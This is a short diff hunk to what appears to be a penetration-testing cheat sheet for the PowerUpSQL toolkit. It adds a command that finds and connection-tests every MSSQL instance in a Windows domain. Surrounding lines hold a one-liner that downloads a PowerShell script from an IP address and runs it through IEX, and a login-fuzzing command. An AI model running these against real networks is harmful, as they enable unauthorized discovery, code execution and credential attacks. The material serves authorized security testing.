@@ -316,6 +316,11 @@ Load PowerUpSQL
 (new-object system.net.webclient).downloadstring('http://192.168.1.1/PowerUpSQL.ps1') | IEX
 ```
 
+Get all accessible domain MSSQL's
+```
+Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10
+```
+
 Enum database users
 ```powershell
 Get-SQLFuzzServerLogin
